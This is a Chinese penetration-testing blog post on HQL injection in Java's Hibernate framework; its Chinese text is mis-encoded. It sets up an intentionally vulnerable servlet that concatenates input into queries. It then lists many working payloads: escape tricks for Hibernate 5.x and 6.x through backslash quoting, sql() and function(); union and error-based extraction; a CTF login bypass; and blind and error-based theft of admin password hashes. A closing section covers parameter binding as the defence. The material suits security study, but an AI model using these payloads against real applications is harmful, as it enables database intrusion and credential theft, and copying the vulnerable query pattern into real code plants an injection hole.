parameter is required.\"); return; } Session session = HibernateUtil.getSessionFactory().openSession(); session.beginTransaction(); try { out.print(\"Hibernate Version: 5.6.15.Final\\n\\n\"); // Query\u003cUser\u003e query = session.createQuery(\"FROM User WHERE name = :parameter\", User.class); // query.setParameter(\"name\", parameter); Query\u003cUser\u003e query = session.createQuery(\"from User where name='\"+ parameter +\"'\", User.class); User user = query.uniqueResult(); if (user != null) { out.println(\"com.example.User found: \" + user.getName() + \", Email: \" + user.getEmail()); } else { out.println(\"No user found with name: \" + parameter); } session.getTransaction().commit(); // } catch (Exception e) { // if (session.getTransaction() != null) { // session.getTransaction().rollback(); // } // out.println(\"Error: \" + e.getMessage()); } finally { session.close(); } } } æ³¨æ„åœ¨æµ‹è¯•æŠ¥é”™æ³¨å…¥æ—¶ï¼Œå»ºè®®æŠŠ catch éƒ¨åˆ†ä»£ç æ³¨é‡Šã€‚ userç±» package com.example; import javax.persistence.*; @Entity @Table(name = \"users\") public class User { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private int id; @Column(name = \"name\") private String name; @Column(name = \"email\") private String email; // Getters and Setters public int getId() { return id; } public void setId(int id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } } HibernateUtilç±» package com.example; import org.hibernate.SessionFactory; import org.hibernate.cfg.Configuration; public class HibernateUtil { private static final SessionFactory sessionFactory = buildSessionFactory(); private static SessionFactory buildSessionFactory() { try { return new Configuration().configure().buildSessionFactory(); } catch (Throwable ex) { throw new ExceptionInInitializerError(ex); } } public static SessionFactory getSessionFactory() { return sessionFactory; } } hibernate.cfg.xmlé…ç½®æ–‡ä»¶ \u003chibernate-configuration\u003e \u003csession-factory\u003e \u003c!-- Database connection settings --\u003e \u003cproperty name=\"hibernate.connection.driver_class\"\u003ecom.mysql.cj.jdbc.Driver\u003c/property\u003e \u003cproperty name=\"hibernate.connection.url\"\u003ejdbc:mysql://localhost:3306/test\u003c/property\u003e \u003cproperty name=\"hibernate.connection.username\"\u003eroot\u003c/property\u003e \u003cproperty name=\"hibernate.connection.password\"\u003epassword\u003c/property\u003e \u003c!-- SQL dialect --\u003e \u003cproperty name=\"hibernate.dialect\"\u003eorg.hibernate.dialect.MySQL8Dialect\u003c/property\u003e \u003c!-- Echo all executed SQL to stdout --\u003e \u003cproperty name=\"hibernate.show_sql\"\u003etrue\u003c/property\u003e \u003cproperty name=\"hibernate.format_sql\"\u003etrue\u003c/property\u003e \u003c!-- Drop and re-create the database schema on startup --\u003e \u003cproperty name=\"hibernate.hbm2ddl.auto\"\u003eupdate\u003c/property\u003e \u003c!-- æ˜¾å¼å£°æ˜å®ä½“ç±» --\u003e \u003cmapping class=\"com.example.User\"/\u003e \u003c/session-factory\u003e \u003c/hibernate-configuration\u003e web.xml \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\" ver","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:1:4","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQLè¯­å¥æ³¨å…¥ HQLæ³¨å…¥å°±æ˜¯åˆ©ç”¨Hibernateæ¡†æ¶äº§ç”Ÿçš„æ³¨å…¥ç‚¹ï¼ŒHibernate ä¸­æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„éªŒè¯å¯¼è‡´æ¶æ„æ•°æ®è¿›å…¥åº”ç”¨ç¨‹åºä¸­é€ æˆçš„ã€‚ æŒ‰ç…§æŸ¥è¯¢æ–¹å¼ä¸åŒä¹Ÿåˆ†ä¸ºä¸¤ç§æ³¨å…¥ï¼šåŸç”ŸSQLè¯­å¥æ³¨å…¥ å’Œ HQLè¯­å¥æ³¨å…¥ åŸç”ŸSQLè¯­å¥æ³¨å…¥ String parameter = req.getParameter(\"name\"); Query query = session.createSQLQuery(\"SELECT table_name FROM information_schema.tables where table_schema='\"+parameter+\"'\"); è¿™ç§å› ä¸ºä½¿ç”¨çš„æ•°æ®åº“åŸç”Ÿçš„è¯­å¥ï¼Œä½¿ç”¨å¯¹åº”æ•°æ®åº“SQLè¯­å¥è¿›è¡Œæ‹¼æ¥æ³¨å…¥å³å¯ï¼Œæ— ä»»ä½•é™åˆ¶ï¼Œè¿™é‡Œä¸åšè®¨è®ºã€‚ åœ¨Hibernate 5.2.5.Final ç‰ˆæœ¬ä¸­createSQLQueryè¢«å¼ƒç”¨äº† HQLè¯­å¥æ³¨å…¥ String parameter = req.getParameter(\"name\"); Query\u003cUser\u003e query = session.createQuery(\"from User where name='\"+ parameter +\"'\", User.class); HQLè¯­å¥æ‰§è¡Œé€»è¾‘ï¼š Hibernateæ¡†æ¶é¦–å…ˆä¼šå»è§£æcreateQuery()å‡½æ•°ä¸­è¯­å¥æ˜¯å¦ç¬¦åˆHQLè¯­æ³•ï¼Œä¸ç¬¦åˆåˆ™ä¼šè§¦å‘HQLè¯­æ³•é”™è¯¯ï¼› ç¬¦åˆHQLè¯­æ³•åï¼ŒHQLæ¡†æ¶å¼•æ“ä¼šå°†å…¶è§£ææˆå¯¹åº”æ•°æ®åº“çš„åŸç”ŸSQLè¯­å¥ï¼› å°†åŸç”ŸSQLè¯­å¥å»æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢è·å–ç»“æœï¼Œæ­¤æ—¶åŸç”ŸSQLè¯­å¥å¦‚æœä¸æ­£ç¡®åˆ™ä¼šå¯¼è‡´æ•°æ®åº“å±‚é¢çš„æŠ¥é”™ï¼ˆä¸åŒæ•°æ®åº“åˆ™æ˜¯ä¸åŒçš„æŠ¥é”™äº†ï¼‰ å›¾ä¸­ä¸Šé¢æ˜¯HQLè¯­æ³•çš„è¯­å¥ã€ä¸‹é¢åˆ™æ˜¯HQLå¼•æ“è½¬æ¢çš„mysqlæ•°æ®åº“çš„SQLè¯­å¥ã€‚ å› æ­¤ä¸Šè¿°è¿‡ç¨‹ä¼šæœ‰ä¸¤ç§é”™è¯¯æ¶ˆæ¯æ¥æºï¼Œä¸€ç§æ¥è‡ªhibernateå¼•æ“ï¼Œä¸€ç§æ¥è‡ªåç«¯æ•°æ®åº“ã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"åˆ¤æ–­æ³¨å…¥ç‚¹ å¯ä»¥é€šè¿‡æ’å…¥ç‰¹æ®Šå­—ç¬¦æ–¹å¼ï¼Œå°è¯•è§¦å‘ä¸Šè¿°ä¸¤ç§æŠ¥é”™ã€‚ ' () ç‰¹æ®Šå­—ç¬¦/Unicode å¦‚æœå‡ºç° org.hibernate.exception æŠ¥é”™ï¼Œåˆ™åç«¯ä½¿ç”¨äº† hibernate æ¡†æ¶ã€‚ HQLæ³¨å…¥ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:1","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQLåŸºç¡€æ³¨å…¥ åŸºç¡€æ³¨å…¥æ–¹å¼å°±æ˜¯çŒœæµ‹è¡¨åã€åˆ—åå»æŸ¥è¯¢æ•°æ®ï¼Œè¿™éƒ¨åˆ†ä¸»è¦ä¾é å­—å…¸çš„èƒ½åŠ› 1ã€å¦‚æœæœ‰æŠ¥é”™ä¿¡æ¯çš„è¯ï¼Œé‚£å°±æ ¹æ®æŠ¥é”™å›æ˜¾å»çœ‹è¡¨åã€åˆ—åï¼Œæ ¹æ®è¡¨åè¿›è¡Œç›²æ³¨æˆ–æŠ¥é”™æ³¨å…¥æŸ¥è¯¢æ•°æ®ã€‚æˆ–è€…æ ¹æ®å›æ˜¾å»çŒœæµ‹å¯èƒ½å­˜åœ¨çš„è¡¨åå’Œåˆ—åï¼Œç„¶åè¿›è¡ŒæŸ¥è¯¢æ•°æ® 2ã€å¦‚æœæ²¡æœ‰æŠ¥é”™ä¿¡æ¯çš„è¯ ä½¿ç”¨andæˆ–orè¿›è¡Œåˆ—åçš„æšä¸¾ ?name=mysql' or xxxxx = '1 ä½¿ç”¨å­æŸ¥è¯¢è¿›è¡Œè¡¨åæšä¸¾ ?name=mysql'or+(select+1+from+XXXX+where+1=2)='1 ä¸»è¦è¿˜æ˜¯æ‹¼çš„å­—å…¸çš„å¥½åã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:2:2","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQLæ³¨å…¥é™åˆ¶ HQLæ³¨å…¥çš„ä¸€å¤§æŒ‘æˆ˜æ˜¯æ³¨å…¥æ¨¡å¼éå¸¸æœ‰é™ï¼Œå…¶æ²¡æœ‰è”åˆè¯­å¥ï¼Œæ²¡æœ‰å‡½æ•°æ¥åˆ›å»ºç®€å•å»¶è¿Ÿï¼Œæ²¡æœ‰ç³»ç»Ÿå‡½æ•°ï¼Œæ²¡æœ‰å¯ç”¨çš„å…ƒæ•°æ®è¡¨ç­‰ã€‚ HibernateæŸ¥è¯¢è¯­è¨€æ²¡æœ‰é‚£äº›åœ¨åå°æ•°æ®åº“ä¸­å¯èƒ½å­˜åœ¨çš„åŠŸèƒ½ç‰¹æ€§ã€‚ ç”¨å…·ä½“æ¡ˆä¾‹çœ‹ä¸€ä¸‹ 1ã€æ­£å¸¸æŸ¥è¯¢ ?name=test ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"unioné™åˆ¶ unionæŸ¥è¯¢åœ¨5.6.15ç‰ˆæœ¬åŠå…¶ä¹‹å‰ä¸æ”¯æŒ name=test' union select 1,2,'3 #æŠ¥é”™ 6.xç‰ˆæœ¬å¼€å§‹æ”¯æŒunionæŸ¥è¯¢ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½åˆ©ç”¨HQLè¯­æ³• name=mysql' union from User where '1'='1 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:1","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"æ³¨é‡Šé™åˆ¶ å¤šè¡Œæ³¨é‡Š/**/ï¼Œåœ¨5.6.15ç‰ˆæœ¬ä¹‹å‰ä¸æ”¯æŒï¼Œåœ¨6.0.1å¼€å§‹æ”¯æŒå¤šè¡Œæ³¨é‡Š ?name=test'+and/**/'1'='1 #5.6.15æŠ¥é”™ ä¸èƒ½ä½¿ç”¨å•è¡Œæ³¨é‡Š#æˆ–+--+ ?name=test'+and+'1'='1'+--+ #æŠ¥é”™ ?name=test'+and+'1'='1'%23 #æŠ¥é”™ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:2","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"å­æŸ¥è¯¢é™åˆ¶ å¯ä»¥ä½¿ç”¨å­æŸ¥è¯¢ï¼Œä½†å¿…é¡»æ˜¯HQLå·²ç»æ˜ å°„çš„è¡¨å’Œå­—æ®µ ?name=test' and (select name from User where id=1)='test æœªæ˜ å°„çš„è¡¨ä¸èƒ½æŸ¥è¯¢ name=test' and (select id from test1 where id=1)='1 #æŠ¥é”™ æœªæ˜ å°„çš„å­—æ®µåä¸èƒ½æŸ¥è¯¢ name=test' and (select newname from User where id=1)='1 #æŠ¥é”™ æ˜ å°„åè¡¨åã€åˆ—åå¤§å°å†™æ•æ„Ÿï¼Œä¹Ÿä¼šæŠ¥é”™ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:3","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"é€šé…ç¬¦*é™åˆ¶ ä¸æ”¯æŒ*æŸ¥è¯¢ ?name=test' and (select * from User where id=1)='1 ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:3:4","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQLæ³¨å…¥è¿›é˜¶ å› ä¸ºHQLæ¡†æ¶ä¸ç®¡ä½ HQLè¯­å¥æ˜¯ä»€ä¹ˆï¼Œæœ€ç»ˆè¿˜æ˜¯è¦è½¬ä¸ºSQLè¯­å¥åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢çš„ã€‚ ä¸‹é¢ä¸»è¦ä»¥MYSQLæ•°æ®åº“è¿›è¡Œç ”ç©¶ï¼Œå½“ç„¶ä¸åŒç‰ˆæœ¬HQLé€ƒé€¸æ–¹å¼æ˜¯ä¸åŒçš„ã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"æ•°æ®åº“å‡½æ•° Hibernateä¼šåœ¨ SELECT å’Œ WHERE è¯­å¥ä¸­éšè—ä¸€äº›ä¸å¯è¯†åˆ«çš„åˆ—åï¼Œå¯¹å‡½æ•°ä¹Ÿä¸€æ ·ã€‚ 1ã€åœ¨ 5.6.15ä¹‹å‰ï¼ŒWHEREå­å¥ä¸­æ˜¯å¯ä»¥ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„ï¼Œè¿™å°±è¯´æ˜æ•°æ®åº“æœ¬èº«çš„å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ è°ƒç”¨æ•°æ®åº“å‡½æ•°çš„æ ‡å‡†è¿‡ç¨‹æ˜¯ äº‹å…ˆæ³¨å†Œå‡½æ•°æ˜ å°„ï¼ˆHQL-\u003eSQLï¼‰ï¼ˆJavaä»£ç ï¼‰ï¼Œä½†æ”»å‡»è€…ä¸éœ€è¦å…³å¿ƒå…¼å®¹æ€§ã€‚ updatexml() version() user() database() ?name=test' and updatexml(1,concat('~',version(),'~'),1)='1 è¿™å—æŠ¥é”™æŠŠä»£ç ä¸­çš„ catchéƒ¨åˆ†ä»£ç æ³¨é‡Šåæ‰ä¼šæ˜¾ç¤ºã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:1","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"å•å¼•å·è½¬ä¹‰ ä½äº5.xç‰ˆæœ¬é€ƒé€¸ åœ¨5.6.15ç‰ˆæœ¬ä¹‹å‰ï¼Œå­˜åœ¨ç€å¯¹HQLä¸SQLå•å¼•å·è½¬ä¹‰çš„å·®å¼‚å¯¼è‡´çš„é€ƒé€¸é—®é¢˜ åœ¨HQLè¯­è¨€ï¼Œå­—ç¬¦ä¸²å’Œå¸¸è§„SQLè¯­å¥ä¸€æ ·éƒ½æ˜¯ä½¿ç”¨å•å¼•å·åŒ…è£¹ from User where name = 'test' å¼•æ“æ˜¯ä¸ä¼šå¯¹å­—ç¬¦ä¸²é‡Œé¢çš„å†…å®¹è¿›è¡Œè§£æçš„ï¼Œå½“åœ¨å­—ç¬¦ä¸²ä¸­åŠ å…¥ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ from Tables where name = 'test\\' HQLå¼•æ“æ˜¯ä¸è¯†åˆ«è½¬ä¹‰å­—ç¬¦\\çš„ï¼Œå®ƒä¼šå°†test\\ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²æ•´ä½“ï¼ŒåŸå°ä¸åŠ¨çš„è½¬ä¸ºmysqlè¯­å¥ æ­¤å¤„å°±å¯¼è‡´äº†ä¸€ä¸ªå·®å¼‚ï¼Œmysqlæ˜¯è¯†åˆ«è½¬è¯‘å­—ç¬¦çš„ï¼Œæ‰€ä»¥çˆ†äº†è¯­æ³•é”™è¯¯ ç„¶ååˆ©ç”¨è¿™ä¸ªå·®å¼‚ï¼Œæ„é€ ä¸€ä¸ªHQLä»¥ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œä½†è½¬ä¸ºmysqlå˜æˆè¯­å¥çš„POCå³å¯ test\\''and 1=2 union select 1,user(),version()# æ‹¼æ¥HQLè¯­å¥ï¼Œæ­¤æ—¶HQLå¼•æ“ä¼šå°†å…¶è§†ä¸ºä¸€æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¼•æ“ä¸å»è§£æ from User where name = 'test\\''and 1=2 union select 1,user(),version()#' æœ€åè½¬ä¸ºSQLè¯­å¥ï¼Œé€ƒé€¸æˆåŠŸæ‰§è¡Œunionè¯­å¥ ä»6.0.1.Finalç‰ˆæœ¬å¼€å§‹ï¼Œæµ‹è¯•å‘ç°è½¬ä¹‰ç¬¦\\å¤±æ•ˆ 'mysql\\a' =\u003e 'mysql\\\\a' 'mysql\\' =\u003e 'mysql\\\\' 'mysql\\'' =\u003e 'mysql''' 'mysql\\''' =\u003e 'mysql''''' ä»6.1.7.Finalç‰ˆæœ¬å¼€å§‹åˆæœ‰äº†å˜åŒ– 'mysql\\a' =\u003e 'mysql\\\\a' 'mysql\\' =\u003e 'mysql\\\\' 'mysql\\'' =\u003e 'mysql\\\\'' 'mysql\\''' =\u003e 'mysql\\\\''' 'mysql\\\\' =\u003e 'mysql\\\\\\\\' æ‰€ä»¥æ— æ³•ä½¿ç”¨æ­¤æ–¹å¼é€ƒé€¸äº† ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:2","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"sql() è¿™éƒ¨åˆ†æˆ‘æ²¡è¿›è¡ŒéªŒè¯ï¼Œæ²¡æœ‰è®°å½• é«˜äº6.x ç‰ˆæœ¬é€ƒé€¸ åœ¨6.xç‰ˆæœ¬ä¸­å‘ç°æ–°å¢äº†ä¸€ä¸ªsql()å‡½æ•°ï¼Œåœ¨5.xç‰ˆæœ¬æ˜¯ä¸æ”¯æŒçš„ https://docs.jboss.org/hibernate/orm/6.0/userguide/html_single/Hibernate_User_Guide.html#hql-function-sql æ„æ€å°±æ˜¯å¯ä»¥æ‰§è¡ŒSQLè¯­å¥ï¼Œä¸»è¦æ˜¯ä¸¤ç§æ–¹å¼ sql('select 1,2,3') sql('select 1,2,?','3') 1ã€ç¬¬ä¸€ç§æ˜¯å°†å‡½æ•°é‡Œé¢çš„å­—ç¬¦ä¸²ç›´æ¥æ‹¼æ¥SQLè¯­å¥ä¸­ï¼Œç„¶åå»æ‰§è¡Œ 2ã€ç¬¬äºŒç§å°±æ˜¯å°†åé¢å‚æ•°é¢„ç¼–è¯‘æ›¿æ¢å ä½ç¬¦?ï¼Œç„¶åå†æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­æ‰§è¡Œ æ—¢ç„¶æ˜¯ä»¥å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œè§£æï¼Œé‚£å°±èƒ½æ„é€ å‡ºpocè¿›è¡Œåˆ©ç”¨ ?name=mysql' and sql('1=2 union select table_name,table_schema from information_schema.tables#')='1 ä¸‹é¢æ˜¯æœ€ç»ˆè§£æå®Œçš„sqlè¯­å¥ï¼ŒæˆåŠŸé€ƒé€¸ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:3","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"function() Hibernateæ¡†æ¶åŒæ—¶æ”¯æŒJPQLè¯­è¨€å’ŒHQLè¯­è¨€çš„ï¼Œå¯åˆ©ç”¨JPQLè¯­è¨€çš„function()å‡½æ•°è¿›è¡Œæ³¨å…¥ https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#hql-user-defined-functions-where-clause function()å‡½æ•°æ˜¯ç”¨æ¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–æ•°æ®åº“è‡ªå¸¦å‡½æ•°çš„ï¼Œå’ŒæŸäº›åŠ¨æ€å‡½æ•°è°ƒç”¨å·®ä¸å¤šå§ function('version') =\u003e version() function('updatexml',1,1,1) =\u003e updatexml(1,1,1) function('aaaa''bbbb',1,1,1) =\u003e aaaa''bbbb(1,1,1) 5.xç‰ˆæœ¬ function('aaaa''bbbb',1,1,1) =\u003e aaaa'bbbb(1,1,1) 6.xç‰ˆæœ¬ ç¬¬ä¸€å‚æ•°ä½œä¸ºå‡½æ•°åï¼Œéšåæ‹¼æ¥ä¸€ä¸ªæ‹¬å·ï¼Œåé¢çš„å‚æ•°åˆ™æ˜¯æ‹¬å·é‡Œçš„å†…å®¹ è€Œfunction()å‡½æ•°çš„åˆ©ç”¨å’Œsql()å‡½æ•°ä¸€æ ·ï¼Œæ˜¯ç›´æ¥æ‹¼æ¥åœ¨è§£æåçš„SQLè¯­å¥ä¸­çš„ï¼Œè€Œä¸”ç¬¬ä¸€å‚æ•°çš„å†…å®¹æ²¡æœ‰ä»»ä½•é™åˆ¶ è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªå¯åˆ©ç”¨POCäº† ?name=test' and function('1=2 union select 1,table_name,table_schema from information_schema.tables#')=' è¿™é‡Œæ³¨æ„functionå‡½æ•°ä¼šåœ¨åé¢æ·»åŠ ä¸€å¯¹æ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨å•è¡Œæ³¨é‡Šè¿›è¡Œæ³¨é‡Š é€šè¿‡function()æ–¹æ³•ï¼Œå¯ä»¥å¯¹ä»»æ„è¡¨è¿›è¡Œè¯»å–ã€‚ æŠ¥é”™æ³¨å…¥ï¼š name=test' and FUNCTION('updatexml',1,concat('~',user(),'~'),1)= ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:4:4","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"HQLæ³¨å…¥é˜²å¾¡ HQLå‚æ•°åç§°ç»‘å®š é˜²å¾¡sqlæ³¨å…¥æœ€å¥½çš„åŠæ³•å°±æ˜¯é¢„ç¼–è¯‘ Query query=session.createQuery(â€œfrom User user where user.name=:customername and user:customerage=:age â€); query.setString(â€œcustomernameâ€,name); query.setInteger(â€œcustomerageâ€,age); HQLå‚æ•°ä½ç½®é‚¦å®šï¼š Query query=session.createQuery(â€œfrom User user where user.name=? and user.age =? â€); query.setString(0,name); query.setInteger(1,age); setParameter() String hql=â€from User user where user.name=:customername â€; Query query=session.createQuery(hql); query.setParameter(â€œcustomernameâ€,name,Hibernate.STRING); setProperties()æ–¹æ³•ï¼š setProperties()æ–¹æ³•å°†å‘½åå‚æ•°ä¸ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å€¼ç»‘å®šåœ¨ä¸€èµ· Customer customer=new Customer(); customer.setName(â€œpanslâ€); customer.setAge(80); Query query=session.createQuery(â€œfrom Customer c where c.name=:name and c.age=:age â€); query.setProperties(customer); setProperties()æ–¹æ³•ä¼šè‡ªåŠ¨å°†customerå¯¹è±¡å®ä¾‹çš„å±æ€§å€¼åŒ¹é…åˆ°å‘½åå‚æ•°ä¸Šï¼Œä½†æ˜¯è¦æ±‚å‘½åå‚æ•°åç§°å¿…é¡»è¦ä¸å®ä½“å¯¹è±¡ç›¸åº”çš„å±æ€§åŒåã€‚ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:5:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"æ¡ˆä¾‹1-ç™»å½•ç»•è¿‡ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"whereè¯­å¥æ³¨å…¥ SCTF2018 : Zhuanxvè¿™é“é¢˜ä¸­ åç¼–è¯‘åclassçœ‹åˆ°hqlè¯­å¥ å‰é¢å®¡è®¡å‡ºæ¡ä»¶ï¼šç”¨æˆ·åè¿‡æ»¤ç©ºæ ¼ä¸ç­‰å· æ‰€ä»¥æ³¨å…¥è¯­å¥ç”¨æ¢è¡Œç¬¦ %0a payload: admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin\u0026user.password=1 æ‹¼æ¥åçš„è¯­å¥ï¼š from User where name = 'admin' or '1'\u003e'0' or name like 'admin\u0026user.password=1' and password = 'password' å®ç°ç™»å½•ç»•è¿‡ ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:1","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"likeè¯­å¥æ³¨å…¥ è¿˜æœ‰ä¸€ç§æ˜¯likeè¯­å¥ç™¾åˆ†å·é‡Œæ³¨å…¥ å¤§åŒå°å¼‚: session.createQuery(\"from Book where title like '%\" + userInput + \"%' and published = true\") Payload : userInput ä¸º ' or 1=1 or ''=' åˆ—å‡ºæ‰€æœ‰æ¡ç›® from Bookwhere title like '%' or 1=1 or ''='%' and published = true çˆ†å‡ºéšè—çš„åˆ—: from Bookwhere title like '%' and promoCode like 'A%' or 1=2 and ''='%' and published = true from Bookwhere title like '%' and promoCode like 'B%' or 1=2 and ''='%' and published = true åˆ—å‡ºæ‰€æœ‰çš„åˆ— åˆ©ç”¨è¿”å›é”™è¯¯å¼‚å¸¸æ¶ˆæ¯ åˆ—åä¸æ˜¯Hibernateä¸­å®ä½“å®šä¹‰çš„ä¸€éƒ¨åˆ†ï¼Œåˆ™å…¶ä¼šè§¦å‘å¼‚å¸¸ from Bookwhere title like '%' and DOESNT_EXIST=1 and ''='%' and published = true è§¦å‘å¼‚å¸¸ï¼š org.hibernate.exception.SQLGrammarException: Column \"DOESNT_EXIST\" not found; SQL statement:select book0_.id as id21_, book0_.author as author21_, book0_.promoCode as promo3_21_, book0_.title as title21_, book0_.published as published21_ from Book book0_ where book0_.title like '%' or DOESNT_EXIST='%' and book0_.published=1 [42122-159] é€šè¿‡è¯¥å¼‚å¸¸ï¼Œå¯ä»¥çœ‹åˆ°HibernateæŸ¥è¯¢çš„åˆ—è¡¨åã€‚ ç›²æ³¨ å¦‚æœæŸ¥è¯¢ä¸ç”¨çš„è¡¨ï¼Œé•¶åµŒä½¿ç”¨å­æŸ¥è¯¢ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹æŸ¥è¯¢ä¼šä»è¡¨ä¸­é€‰æ‹©ä¸€æ¡ä¸â€œUserâ€å®ä½“å…³è”çš„é¡¹ from Bookwhere title like '%' and (select substring(password,1,1) from User where username='admin') = 'a' or ''='%' and published = true ä¹‹åå°±å¯ä»¥æŒ‰å¸¸è§„çš„ç›²æ³¨æ¨¡å¼è¿›è¡Œç›²æ³¨äº†ã€‚ éç›²æ³¨ from Bookwhere title like '%11' and (select password from User where username='admin')=1 or ''='%' and published = true Hibernate å°†å¼‚å¸¸æ¶ˆæ¯è¿”å›ï¼š Data conversion error converting \"3f3ff0cdbfa0d515f8e3751e4ed98abe\"; SQL statement:select book0_.id as id18_, book0_.author as author18_, book0_.promotionCode as promotio3_18_, book0_.title as title18_, book0_.visible as visible18_ from Book book0_ where book0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and book0_.published=1 [22018-159] åˆ©ç”¨æ•°æ®åº“å‡½æ•° å¦‚ï¼šè‹¥æ•°æ®åº“æ”¯æŒgroup_concatå‡½æ•°ï¼š from Bookwhere title like '%11' and (select cast(group_concat(password) as string) from User)=1 or ''='%' and published = true åˆ™å¼‚å¸¸è§¦å‘ä¸ºï¼š Data conversion error converting\"3f3ff0cdbfa0d515f8e3751e4ed98abe,79a41d71c31128ffab81ac8df2069f9c,b7fe6f6a1024db6e56027aeb558f9e68\";SQL statement: select book0_.id as id18_, book0_.author as author18_, book0_.promotionCodeas promotio3_18_, book0_.title as title18_, book0_.visible as visible18_ from Book book0_ where book0_.title like '%11' and (select cast(group_concat(user1_.password) as varchar(255)) from User user1_)=1 or ''='%' and book0_.published=1 [22018-159] 